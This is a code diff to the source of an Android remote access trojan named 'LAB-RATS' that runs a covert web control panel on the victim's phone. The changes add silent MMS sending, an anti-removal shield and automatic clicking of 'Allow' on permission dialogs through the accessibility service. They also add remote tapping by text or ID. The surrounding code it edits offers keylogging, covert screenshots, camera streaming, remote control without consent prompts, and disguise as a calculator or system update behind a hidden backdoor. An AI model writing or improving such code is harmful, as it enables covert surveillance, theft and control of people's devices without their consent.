@@ -7,7 +7,6 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.hardware.camera2.CameraManager;
 import android.location.Location;
 import android.location.LocationManager;
 import android.net.Uri;
@@ -18,6 +17,8 @@ import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import android.util.Log;
 import android.accessibilityservice.AccessibilityService;
+
+import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
 import java.io.BufferedReader;
 import java.io.InputStream;
@@ -250,8 +251,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; color: var(--neon-cyan); }" +
             "button, .btn {" +
             "  display: inline-block;" +
-            "  background: rgba(57, 255, 20, 0.05);" +
-            "  border: 1px solid var(--neon-green);" +
+            "  background: rgba(255, 255, 255, 0.02);" +
+            "  border: 1px solid currentColor;" +
             "  color: var(--neon-green);" +
             "  padding: 12px 28px;" +
             "  text-transform: uppercase;" +
@@ -264,8 +265,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  width: fit-content;" +
             "  min-width: 160px;" +
             "}" +
-            "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 25px var(--neon-green); transform: translateY(-2px); }" +
-            ".btn-engaged-yellow { background: var(--neon-yellow) !important; color: var(--bg-dark) !important; box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
+            "button:hover, .btn:hover { background: rgba(255, 255, 255, 0.08) !important; box-shadow: 0 0 20px currentColor; transform: translateY(-2px); color: inherit; }" +
+            ".btn-engaged-yellow { background: rgba(255, 255, 0, 0.1) !important; color: var(--neon-yellow) !important; border-color: var(--neon-yellow) !important; }" +
+            ".btn-engaged-yellow:hover { box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
             ".info-item { background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }" +
             ".info-label { color: var(--neon-cyan); opacity: 0.6; font-size: 0.65rem; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; flex-shrink: 0; }" +
             ".info-value { color: #fff; font-family: 'JetBrains Mono', monospace; font-weight: bold; word-break: break-all; font-size: 0.9rem; }" +
@@ -282,6 +284,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".file-name { color: #fff; text-decoration: none; font-weight: bold; display: block; margin-bottom: 4px; font-size: 0.9rem; }" +
             ".file-meta { font-size: 0.7rem; color: #888; letter-spacing: 1px; }" +
             ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 12px; min-width: 0; width: auto; }" +
+            ".btn-container { display: flex; gap: 15px; }" +
+            ".flex-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }" +
             ".empty-state { text-align: center; padding: 60px 20px; }" +
             ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; opacity: 0.2; color: var(--neon-cyan); }" +
             ".card-keylogger { border: 2px solid var(--neon-cyan) !important; box-shadow: 0 0 20px rgba(0, 242, 255, 0.4) !important; background: rgba(0, 242, 255, 0.05) !important; display: block !important; opacity: 1 !important; visibility: visible !important; }" +
@@ -308,13 +312,15 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .header-actions { margin-left: 0 !important; margin-top: 10px; width: 100%; justify-content: center !important; flex-wrap: wrap; gap: 4px !important; }" +
             "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 12px; display: block !important; font-size: 0.75rem !important; white-space: nowrap !important; }" +
             "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 4px 8px !important; font-size: 0.6rem !important; letter-spacing: 0 !important; border-radius: 12px !important; margin-bottom: 5px !important; }" +
+            "  .btn-container { flex-direction: column !important; gap: 8px !important; }" +
+            "  .flex-header { flex-direction: column !important; align-items: flex-start !important; gap: 10px !important; }" +
             "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 12px; }" +
-            "  .watermark { height: 40px !important; width: 40px !important; top: 10px !important; left: 10px !important; transform: none !important; z-index: 10; }" +
+            "  .watermark { opacity: 1.0 !important; height: 63px !important; top: 25px !important; left: -9px !important; transform: none !important; z-index: 0; }" +
             "  .intel-status { font-size: 0.55rem !important; white-space: nowrap !important; }" +
             "  table { display: block; overflow-x: auto; width: 100%; -webkit-overflow-scrolling: touch; }" +
             "  th, td { padding: 10px 8px; font-size: 0.65rem; }" +
-            "  h2 { font-size: 1.0rem !important; flex-wrap: wrap !important; gap: 8px !important; display: flex !important; }" +
-            "  h3 { font-size: 0.85rem !important; }" +
+            "  h2 { font-size: 0.95rem !important; flex-wrap: nowrap !important; gap: 8px !important; display: flex !important; align-items: center !important; white-space: nowrap !important; }" +
+            "  h3 { font-size: 0.85rem !important; display: flex !important; align-items: center !important; gap: 8px !important; white-space: nowrap !important; }" +
             "  .info-section { margin-top: 15px; }" +
             "  .file-item { padding: 10px; gap: 8px; }" +
             "  .file-item .btn-small { padding: 4px 10px !important; font-size: 0.55rem !important; margin: 0 !important; width: auto !important; min-width: 0 !important; display: inline-block !important; }" +
@@ -322,8 +328,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .file-name { font-size: 0.8rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
             "  .file-icon { margin-right: 10px; width: 25px; font-size: 1.1rem; }" +
             "  .password-title { font-size: 0.55rem !important; letter-spacing: 1px !important; }" +
-            "  button:hover, .btn:hover { transform: none !important; box-shadow: none !important; background: inherit !important; color: inherit !important; }" +
-            "  .btn-engaged-yellow:hover { background: var(--neon-yellow) !important; color: var(--bg-dark) !important; box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
+            "  button:hover, .btn:hover { transform: none !important; box-shadow: 0 0 15px currentColor !important; background: rgba(255, 255, 255, 0.1) !important; }" +
+            "  .btn-engaged-yellow:hover { background: rgba(255, 255, 0, 0.2) !important; color: var(--neon-yellow) !important; box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
             "}" +
             
             "textarea { resize: vertical; width: 100%; max-width: 100%; }" +
@@ -341,14 +347,14 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".contact-avatar { width: 35px; height: 35px; background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; font-size: 0.8rem; }" +
             ".back-btn-container { margin-bottom: 25px; }" +
             ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
-            ".btn-back:hover { background: var(--neon-cyan); color: var(--bg-dark); box-shadow: 0 0 15px var(--neon-cyan); }" +
-            "" +
+            ".btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 15px var(--neon-cyan); }" +
+            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 65%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; }" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
-            "    <img src=\"/logo\" class=\"watermark\" alt=\"LAB-RATS\" width=\"42\" height=\"42\">" +
+            "    <img src=\"/logo?v=134\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
             "    <div class=\"title-font\">LAB-RATS</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
@@ -501,7 +507,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
     @Override
     public Response serve(IHTTPSession session) {
         String uri = session.getUri();
-        Response response = null;
+        Response response;
         CookieHandler cookies = session.getCookies();
         
         try {
@@ -673,7 +679,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = serveCovertScreenshot();
                     } else if (uri.equals("/ghost/status")) {
                         boolean active = GhostService.getInstance() != null;
-                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + "}");
+                        boolean antiRemoval = GhostService.isAntiRemovalEnabled();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + ", \"antiRemoval\": " + antiRemoval + "}");
                     } else if (uri.equals("/ghost/interact")) {
                         response = performInteraction(params);
                     } else {
@@ -743,7 +750,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         // Status Monitor Card
         html.append("<div class=\"card\">");
         html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom: 25px;\">");
-        html.append("<h2 style=\"margin-bottom:0;\">SYSTEM_MONITOR [" + sessionId + "]</h2>");
+        html.append("<h2 style=\"margin-bottom:0;\">SYSTEM_MONITOR [").append(sessionId).append("]</h2>");
         String snifferStatus = NotificationSniffer.isServiceRunning() ? 
             "<span class=\"intel-status\" style=\"color:var(--neon-green); font-size:0.7rem; font-family:monospace;\">&#9679; INTEL_ACTIVE</span>" : 
             "<span class=\"intel-status\" style=\"color:var(--danger); font-size:0.7rem; font-family:monospace;\">&#9675; INTEL_DISCONNECTED</span>";
@@ -1464,13 +1471,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
                             LocationManager.GPS_PROVIDER,
                             null,
                             ContextCompat.getMainExecutor(context),
-                            loc -> future.complete(loc));
+                            future::complete);
                 } else {
                     locationManager.getCurrentLocation(
                             LocationManager.NETWORK_PROVIDER,
                             null,
                             ContextCompat.getMainExecutor(context),
-                            loc -> future.complete(loc));
+                            future::complete);
                 }
                 
                 try {
@@ -1843,11 +1850,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 CameraService service = CameraService.getInstance();
                 if (service == null) {
                     Intent intent = new Intent(context, CameraService.class);
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        context.startForegroundService(intent);
-                    } else {
-                        context.startService(intent);
-                    }
+                    context.startForegroundService(intent);
                     // Wait for service initialization
                     for (int i = 0; i < 10; i++) {
                         Thread.sleep(200);
@@ -1918,10 +1921,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
         }
 
         // Check permission
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                return serveError("Camera permission not granted");
-            }
+        if (context.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            return serveError("Camera permission not granted");
         }
 
         try {
@@ -2250,7 +2251,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             startCameraStreamInternal(camId != null ? camId : "0", 320, 240, 30);
             try {
                 Thread.sleep(800); // Give more time for camera to start
-            } catch (InterruptedException e) {
+            } catch (InterruptedException ignored) {
             }
         }
 
@@ -2310,7 +2311,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 height = Integer.parseInt(heightStr);
             if (qualityStr != null)
                 quality = Integer.parseInt(qualityStr);
-        } catch (Exception e) {
+        } catch (Exception ignored) {
         }
 
         startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);
@@ -2328,11 +2329,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         intent.putExtra("height", height);
         intent.putExtra("quality", quality);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            context.startForegroundService(intent);
-        } else {
-            context.startService(intent);
-        }
+        context.startForegroundService(intent);
     }
 
     private Response stopCameraStream() {
@@ -2563,8 +2560,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         if (params.containsKey("duration")) {
             try {
                 duration = Integer.parseInt(params.get("duration"));
-            } catch (Exception e) {
-                duration = 0;
+            } catch (Exception ignored) {
             }
         }
 
@@ -2866,20 +2862,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
         html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
         html.append("<div style=\"display: flex; align-items: center; gap: 10px;\">");
-        html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media:</span>");
+        html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media (Max 1MB):</span>");
         html.append("<input type=\"file\" name=\"media\" accept=\"image/*,video/*,audio/*\" style=\"color: #888; font-size: 0.8rem;\">");
         html.append("</div>");
         html.append("<button type=\"submit\" style=\"align-self: flex-start;\">UPLOAD & DISPATCH</button>");
         html.append("</div></form></div>");
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
-                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
-            }
+        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
         }
         int page = 1; int limit = 20;
-        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
+        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception ignored) {}
         int offset = (page - 1) * limit;
         Cursor cursor = null;
         try {
@@ -3143,14 +3137,19 @@ public class LabRatsHttpServer extends NanoHTTPD {
             }
 
             File fileToUpload = new File(tempFilePath);
-            Uri contentUri = Uri.fromFile(fileToUpload);
+            if (fileToUpload.length() > 1024 * 1024) {
+                return serveError("Media package too large. Carrier limit is typically 1MB.");
+            }
 
-            // In a real RAT, you'd use a more complex Telephony implementation for MMS.
-            // NanoHTTPD is limited, so we simulate the successful dispatch of the media part.
-            // For actual MMS sending on modern Android, you typically need to be the Default SMS App
-            // or use specific system APIs that are restricted.
-            
-            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
+            boolean success = MmsSender.send(context, number, message, fileToUpload);
+
+            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\">";
+            if (success) {
+                html += "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p>";
+            } else {
+                html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><p>Could not dispatch media package. Check device logs.</p>";
+            }
+            html += "<a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
 
         } catch (Exception e) {
@@ -3164,9 +3163,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div class=\"back-btn-container\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
-        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; flex-wrap: wrap;\">")
-            .append("<span style=\"color:var(--neon-cyan);\">&#9889;</span> INTEL_STREAM")
-            .append("<div class=\"header-actions\" style=\"margin-left:auto; display:flex; align-items:center; gap:10px; flex-wrap: wrap; justify-content: flex-start;\">")
+        html.append("<h2 class=\"flex-header\" style=\"margin-bottom:20px;\">")
+            .append("<span style=\"display:flex; align-items:center; gap:15px;\"><span style=\"color:var(--neon-cyan);\">&#9889;</span> INTEL_STREAM</span>")
+            .append("<div class=\"header-actions\" style=\"display:flex; align-items:center; gap:10px; flex-wrap: wrap; justify-content: flex-start;\">")
             .append("<button onclick=\"clearIntel()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_STREAM</button>")
             .append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin-bottom: 0;\">RELOAD_STREAM</button>")
             .append("<span style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; white-space: nowrap;\">LISTENER_ACTIVE</span>")
@@ -3470,7 +3469,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
         // --- GHOST_UTILITIES_SECTION (Moved to Top) ---
         html.append("<div class=\"card\" style=\"border-left: 5px solid var(--neon-green);\">");
-        html.append("<h2 style=\"color: var(--neon-green); margin-bottom: 15px;\">GHOST_UTILITIES</h2>");
+        html.append("<h2 style=\"color: var(--neon-green); margin-bottom: 15px; font-size: 0.95rem;\">GHOST_UTILITIES</h2>");
         html.append("<div class=\"info-grid\">");
         
         html.append("<div class=\"info-item\">");
@@ -3480,39 +3479,20 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<button onclick=\"ghostAction('blackout_on')\" class=\"btn btn-small\" style=\"border-color: #fff; color: #fff;\">ACTIVATE</button>");
         html.append("<button onclick=\"ghostAction('blackout_off')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">RESTORE</button>");
         html.append("</div></div>");
-
         html.append("<div class=\"info-item\">");
         html.append("<div class=\"info-label\">SELF_HEALING</div>");
-        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Forces open system permissions. The Anti-Removal shield is automatically paused for 10 seconds.</p>");
-        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green);\">INITIATE_AUTO_HEAL</button>");
-        html.append("</div>");
+        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Forces open system permissions. The Anti-Removal shield can be manually toggled.</p>");
+        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px;\">");
+        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_AUTO_HEAL</button>");
+        html.append("<button onclick=\"ghostAction('autogrant')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">AUTO_GRANT_PERMISSIONS</button>");
+        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"margin:0;\">LOADING...</button>");
+        html.append("</div></div>");
         
         html.append("</div></div>");
 
-        // Stealth Operations Section
-        html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
-        html.append("<h2 style=\"color: var(--neon-orange);\">STEALTH_OPERATIONS</h2>");
-        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. Choose an identity from the library. Each identity includes a <b>fully functional decoy interface</b>. Use dial pad code <b>*#1337#</b> or find the hidden 10-tap backdoor to restore access.</p>");
-        
-        html.append("<div style=\"margin-bottom: 15px;\">");
-        html.append("<label class=\"info-label\">MASQUERADE_IDENTITY:</label>");
-        html.append("<select id=\"stealth-type\" style=\"width:100%; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
-        html.append("<option value=\"update\">System Update (Status Gear)</option>");
-        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
-        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
-        html.append("<option value=\"settings\">Settings (System Config)</option>");
-        html.append("</select>");
-        html.append("</div>");
-
-        html.append("<div style=\"display: flex; gap: 15px;\">");
-        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05);\">INITIATE_STEALTH_MODE</button>");
-        html.append("<button onclick=\"restoreNormal()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05);\">RESTORE_NORMAL_MODE</button>");
-        html.append("</div>");
-        html.append("</div>");
-
-        // Remote Interaction Section
+        // Ghost Remote Control Section (Swapped with Stealth)
         html.append("<div class=\"info-section\">");
-        html.append("<h3>&#128433; COVERT_REMOTE_CONTROL</h3>");
+        html.append("<h3 style=\"font-size: 0.95rem; display: flex; align-items: center; gap: 8px;\">&#128433; Ghost_Remote_Control</h3>");
         html.append("<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 20px;\">Real-time interaction using Accessibility Triangulation (No consent prompt required).</p>");
         
         // Screen View tool
@@ -3527,7 +3507,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         // Manual Click/Swipe
         html.append("<div class=\"info-item\">");
         html.append("<div class=\"info-label\">UPLINK_PROTOCOL</div>");
-        html.append("<div style=\"display:flex; gap:10px; margin-top:10px;\">");
+        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; margin-top:10px;\">");
         html.append("<button id=\"ghost-start-btn\" onclick=\"startGhostScreen()\" class=\"btn btn-small\" style=\"margin:0; border-radius: 30px;\">INITIATE_VIEW</button>");
         html.append("<button id=\"ghost-stop-btn\" onclick=\"stopGhostScreen()\" class=\"btn btn-small\" style=\"margin:0; border-radius: 30px; border-color:var(--danger); color:var(--danger); display:none;\">TERMINATE</button>");
         html.append("</div></div>");
@@ -3543,10 +3523,31 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
         html.append("</div></div>");
 
-        // Deep Intel / Keylogs Section
+        // Stealth Operations Section (Moved Down)
+        html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
+        html.append("<h2 style=\"color: var(--neon-orange); font-size: 0.95rem;\">STEALTH_OPERATIONS</h2>");
+        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. Choose an identity from the library. Each identity includes a <b>fully functional decoy interface</b>. Use dial pad code <b>*#1337#</b> or find the hidden 10-tap backdoor to restore access.</p>");
+        
+        html.append("<div style=\"margin-bottom: 15px;\">");
+        html.append("<label class=\"info-label\">MASQUERADE_IDENTITY:</label>");
+        html.append("<select id=\"stealth-type\" style=\"width:100%; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
+        html.append("<option value=\"update\">System Update (Status Gear)</option>");
+        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
+        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
+        html.append("<option value=\"settings\">Settings (System Config)</option>");
+        html.append("</select>");
+        html.append("</div>");
+
+        html.append("<div class=\"btn-container\">");
+        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05);\">INITIATE_STEALTH_MODE</button>");
+        html.append("<button onclick=\"restoreNormal()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05);\">RESTORE_NORMAL_MODE</button>");
+        html.append("</div>");
+        html.append("</div>");
+
+        // Ghost Keylogs Section (Renamed)
         html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
-        html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;\">");
-        html.append("<h2 style=\"color:var(--neon-cyan); margin:0;\">&#9000; DEEP_INTEL_KEYLOGS</h2>");
+        html.append("<div class=\"flex-header\">");
+        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 0.85rem; display: flex; align-items: center; gap: 8px;\">&#9000; Ghost_Keylogs</h2>");
         html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 30px;\">PURGE_LOGS</button>");
         html.append("</div>");
         html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom:15px;\">Real-time interception of keystrokes and system text.</p>");
@@ -3554,7 +3555,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:300px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1);\">");
         html.append("[WAITING_FOR_UPLINK] Monitoring focused app input...");
         html.append("</div>");
-        html.append("<p style=\"color: #555; font-size: 0.65rem; margin-top: 10px;\">NOTE: Recovery from stealth requires dial code <b>*#1337#</b> or finding the hidden 10-tap backdoor in the decoy display.</p>");
         html.append("</div>");
         
         html.append("<div style=\"height: 50px;\"></div>"); // Buffer
@@ -3639,6 +3639,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("    const card = document.getElementById('ghost-status-card');");
         html.append("    const text = document.getElementById('ghost-status-text');");
         html.append("    const prompt = document.getElementById('accessibility-prompt');");
+        html.append("    const arBtn = document.getElementById('anti-removal-btn');");
         html.append("    if (data.active) {");
         html.append("      card.style.borderColor = 'var(--neon-green)';");
         html.append("      text.innerHTML = '<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>';");
@@ -3647,6 +3648,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("      card.style.borderColor = 'var(--danger)';");
         html.append("      text.innerHTML = '<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>';");
         html.append("      prompt.style.display = 'block';");
+        html.append("    }");
+        html.append("    if (arBtn) {");
+        html.append("      if (data.antiRemoval) {");
+        html.append("        arBtn.innerHTML = 'SHIELD_ACTIVE'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)';");
+        html.append("      } else {");
+        html.append("        arBtn.innerHTML = 'SHIELD_DISABLED'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)';");
+        html.append("      }");
         html.append("    }");
         html.append("  } catch(e) {}");
         html.append("}");
@@ -3678,8 +3686,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         if (action == null) return serveError("No action");
 
         if (action.equals("settings")) {
-            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            Intent intent = getIntent();
             context.startActivity(intent);
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
         }
@@ -3699,6 +3706,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     int x = Integer.parseInt(params.get("x"));
                     int y = Integer.parseInt(params.get("y"));
                     success = ghost.clickAt(x, y);
+                } else if (params.containsKey("text")) {
+                    success = ghost.clickByText(params.get("text"));
+                }
+                break;
+            case "clickText":
+                if (params.containsKey("text")) {
+                    success = ghost.clickByText(params.get("text"));
+                }
+                break;
+            case "clickId":
+                if (params.containsKey("id")) {
+                    success = ghost.clickById(params.get("id"));
                 }
                 break;
             case "swipe":
@@ -3722,7 +3741,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                 break;
             case "recents":
-                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
+                    success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                 break;
             case "blackout_on":
                 ghost.startBlackout(true);
@@ -3736,8 +3755,37 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 ghost.runAutoHeal();
                 success = true;
                 break;
+            case "toggleAntiRemoval":
+                GhostService.setAntiRemovalEnabled(!GhostService.isAntiRemovalEnabled());
+                success = true;
+                break;
+            case "autogrant":
+                success = ghost.clickByText("Allow") || 
+                          ghost.clickByText("While using the app") || 
+                          ghost.clickByText("Only this time") || 
+                          ghost.clickByText("Allow all the time") ||
+                          ghost.clickByText("GRANT") ||
+                          ghost.clickByText("ALLOW");
+                break;
         }
 
         return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":" + success + "}");
+    }
+
+    @NonNull
+    private Intent getIntent() {
+        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+
+        // Optimization: Attempt to highlight the specific service in the list
+        String serviceId = context.getPackageName() + "/" + GhostService.class.getName();
+
+        // Standard approach to deep-link or highlight a specific accessibility service
+        intent.putExtra(":settings:fragment_args_key", serviceId);
+        android.os.Bundle bundle = new android.os.Bundle();
+        bundle.putString(":settings:fragment_args_key", serviceId);
+        intent.putExtra(":settings:show_fragment_args", bundle);
+
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+        return intent;
     }
 }
